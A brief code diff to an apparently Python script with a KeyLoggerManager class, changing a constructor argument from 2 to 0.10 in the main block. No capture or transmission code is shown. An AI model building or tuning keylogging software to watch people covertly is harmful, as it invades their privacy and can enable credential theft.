@@ -12,4 +12,5 @@ class KeyLoggerManager:
         self.service.start_monitoring()
 
 if __name__ == "__main__":
-    manager = KeyLoggerManager(2)
+    manager = KeyLoggerManager(0.10)
+
